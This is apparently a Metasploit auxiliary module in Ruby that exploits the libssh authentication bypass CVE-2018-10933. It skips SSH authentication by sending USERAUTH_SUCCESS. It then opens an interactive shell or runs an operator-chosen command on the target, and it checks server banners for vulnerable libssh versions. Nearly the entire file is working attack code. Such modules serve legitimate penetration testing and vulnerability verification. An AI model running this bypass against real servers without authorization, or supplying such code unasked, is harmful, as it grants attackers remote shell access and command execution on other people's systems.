##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::SSH
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::CommandShell
  include Msf::Auxiliary::Report
  include Msf::Sessions::CreateSessionOptions
  include Msf::Auxiliary::ReportSummary

  # A request response, even a refusal, proves the session channel was opened.
  class ProofCommandStream < Net::SSH::CommandStream
    attr_reader :channel_opened

    def initialize(ssh, cmd = nil, **options)
      @ready = Queue.new
      super
    end

    def shell_requested(channel, success)
      @channel_opened = true
      super
    ensure
      @ready << nil
    end

    def handle_error(error: nil)
      @ready << error
      super
    end

    def wait_ready
      @ready.pop
    end
  end

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'libssh Authentication Bypass Scanner',
        'Description' => %q{
          This module exploits an authentication bypass in libssh server code
          where a USERAUTH_SUCCESS message is sent in place of the expected
          USERAUTH_REQUEST message. libssh versions 0.6.0 through 0.7.5 and
          0.8.0 through 0.8.3 are vulnerable.

          Note that this module's success depends on whether the server code
          can trigger the correct (shell/exec) callbacks despite only the state
          machine's authenticated state being set.

          Therefore, you may or may not get a shell if the server requires
          additional code paths to be followed.
        },
        'Author' => [
          'Peter Winter-Smith', # Discovery
          'wvu'                 # Module
        ],
        'References' => [
          ['CVE', '2018-10933'],
          ['URL', 'https://www.libssh.org/security/advisories/CVE-2018-10933.txt'],
          ['ATT&CK', Mitre::Attack::Technique::T1021_004_SSH]
        ],
        'DisclosureDate' => '2018-10-16',
        'License' => MSF_LICENSE,
        'Actions' => [
          ['Shell', 'Description' => 'Spawn a shell'],
          ['Execute', 'Description' => 'Execute a command']
        ],
        'DefaultAction' => 'Shell',
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options([
      Opt::RPORT(22),
      OptString.new('CMD', [false, 'Command or alternative shell']),
      OptBool.new('SPAWN_PTY', [false, 'Spawn a PTY', false]),
      OptBool.new('CHECK_BANNER', [false, 'Check banner for libssh', true])
    ])

    register_advanced_options([
      OptBool.new('SSH_DEBUG', [false, 'SSH debugging', false]),
      OptInt.new('SSH_TIMEOUT', [false, 'SSH timeout', 10])
    ])
  end

  # Vulnerable since 0.6.0 and patched in 0.7.6 and 0.8.4
  def check_banner(ip, version)
    banner = version.match(/libssh[_-]?([\d.]*)$/)

    if banner.nil?
      vprint_error("#{ip}:#{rport} - #{version} does not appear to be libssh")
      Exploit::CheckCode::Unknown("#{version} does not appear to be libssh")
    elsif banner[1].empty?
      vprint_warning("#{ip}:#{rport} - libssh version not reported")
      Exploit::CheckCode::Detected('libssh detected but version not reported')
    elsif (v = Rex::Version.new(banner[1])).between?(Rex::Version.new('0.6.0'), Rex::Version.new('0.7.5')) ||
          v.between?(Rex::Version.new('0.8.0'), Rex::Version.new('0.8.3'))
      vprint_good("#{ip}:#{rport} - #{version} appears to be unpatched")
      Exploit::CheckCode::Appears("#{version} appears to be unpatched")
    else
      vprint_error("#{ip}:#{rport} - #{version} appears to be patched")
      Exploit::CheckCode::Safe("#{version} appears to be patched")
    end
  end

  def run_host(ip)
    if action.name == 'Execute' && datastore['CMD'].blank?
      fail_with(Failure::BadConfig, 'Execute action requires CMD to be set')
    end

    ssh_opts = ssh_client_defaults.merge({
      port: rport,
      # The auth method is converted into a class name for instantiation,
      # so libssh-auth-bypass here becomes LibsshAuthBypass from the mixin
      auth_methods: ['libssh-auth-bypass']
    })

    ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    print_status("#{ip}:#{rport} - Attempting authentication bypass")

    begin
      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
        Net::SSH.start(ip, username, ssh_opts)
      end
    rescue Net::SSH::Exception => e
      vprint_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
      return
    end

    return unless ssh

    version = ssh.transport.server_version.version

    # The local bypass auth method alone is not proof; require a session channel.
    if datastore['CHECK_BANNER']
      banner_result = check_banner(ip, version)
      return unless [Exploit::CheckCode::Appears, Exploit::CheckCode::Detected].include?(banner_result)
    end

    if action.name == 'Execute'
      result = execute_command(ssh)
      report_bypass(ip, version) if result[:channel_opened]
      output = result[:output]
      return if output.nil?

      print_status("Attempting #{action.name.inspect} Action, see \"show actions\" for more details")
      if output.blank?
        print_error("#{ip}:#{rport} - Empty or blank command output")
        return
      end

      print_status("#{ip}:#{rport} - Executed: #{datastore['CMD']}\n#{output}")
      return
    end

    shell = ProofCommandStream.new(ssh, datastore['CMD'], pty: datastore['SPAWN_PTY'], logger: self)

    timed_out = false
    begin
      ready_error = ::Timeout.timeout(datastore['SSH_TIMEOUT']) { shell.wait_ready }
    rescue ::Timeout::Error => e
      print_error('SSH shell channel request timed out')
      elog('SSH shell channel request timed out', error: e)
      timed_out = true
    end

    report_bypass(ip, version) if shell.channel_opened
    return if timed_out

    if (e = ready_error || shell.error)
      print_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
      return
    end

    print_status("Attempting #{action.name.inspect} Action, see \"show actions\" for more details")
    if datastore['CreateSession']
      session_created = !!start_session(self, "#{self.name} (#{version})", {}, false, shell.lsock)
    end
  ensure
    close_ssh(ssh) if ssh && !session_created
  end

  def rport
    datastore['RPORT']
  end

  def username
    Rex::Text.rand_text_alphanumeric(8..42)
  end

  private

  def report_bypass(ip, version)
    service = report_service(host: ip, port: rport, proto: 'tcp', name: 'ssh', info: version)
    report_vuln(
      host: ip,
      port: rport,
      proto: 'tcp',
      sname: 'ssh',
      service: service,
      name: name,
      refs: references,
      info: version
    )
  end

  def execute_command(ssh)
    result = { channel_opened: false, output: nil }
    output = String.new
    ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
      channel = ssh.open_channel do |command_channel|
        result[:channel_opened] = true
        command_channel.request_pty if datastore['SPAWN_PTY']
        command_channel.exec(datastore['CMD']) do |_channel, success|
          raise Net::SSH::ChannelRequestFailed, 'Exec channel request failed' unless success
        end
        command_channel.on_data { |_channel, data| output << data }
      end
      # Waiting for channel closure collects delayed and fragmented stdout.
      channel.wait
    end
    result[:output] = output.chomp
    result
  rescue Net::SSH::Exception, ::Timeout::Error, ::IOError, Errno::ECONNRESET, Errno::EPIPE => e
    print_error("SSH command execution failed: #{e.class}: #{e.message}")
    elog('SSH command execution failed', error: e)
    result
  end

  def close_ssh(ssh)
    ::Timeout.timeout(datastore['SSH_TIMEOUT']) { ssh.close unless ssh.closed? }
  rescue Net::SSH::Exception, ::Timeout::Error, ::IOError, Errno::ECONNRESET, Errno::EPIPE => e
    vprint_error("SSH connection cleanup failed: #{e.message}")
    elog('SSH connection cleanup failed', error: e)
  ensure
    # A refused or timed-out channel must not keep cleanup waiting on the peer.
    begin
      ssh.shutdown! unless ssh.closed?
    rescue Net::SSH::Exception, ::IOError, Errno::ECONNRESET, Errno::EPIPE => e
      vprint_error("SSH connection shutdown failed: #{e.message}")
      elog('SSH connection shutdown failed', error: e)
    end
  end
end
